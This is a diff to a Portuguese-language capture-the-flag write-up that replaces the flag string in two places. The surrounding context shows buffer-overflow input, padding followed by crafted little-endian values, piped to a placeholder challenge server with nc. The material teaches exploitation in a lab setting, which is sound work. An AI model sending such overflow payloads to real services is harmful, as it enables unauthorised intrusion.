@@ -377,7 +377,7 @@ Enviado para o servidor:
 ```
 cat exploit.txt | nc [insira o servidor e a porta aqui]
 Parabens!
-Ganesh{y0ur_buff3r_1s_th3_buff3r_th4t_w1ll_p1erc3_th3_chunk5}
+Ganesh{eu_finalmente_consegu1_set4r_1_chall_n0_s3rvidor}
 ```
 
 É possível fazer também com o echo, utilizando o seguinte comando:
@@ -385,5 +385,5 @@ Ganesh{y0ur_buff3r_1s_th3_buff3r_th4t_w1ll_p1erc3_th3_chunk5}
 ```
 echo -e "AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHH\x01\x00\x00\x00\x02\x00\x00\x00\x03\x00\x00\x00\x04\x00\x00\x00" | nc [insira o servidor e a porta aqui]
 Parabens!
-Ganesh{y0ur_buff3r_1s_th3_buff3r_th4t_w1ll_p1erc3_th3_chunk5}
+Ganesh{eu_finalmente_consegu1_set4r_1_chall_n0_s3rvidor}
 ```
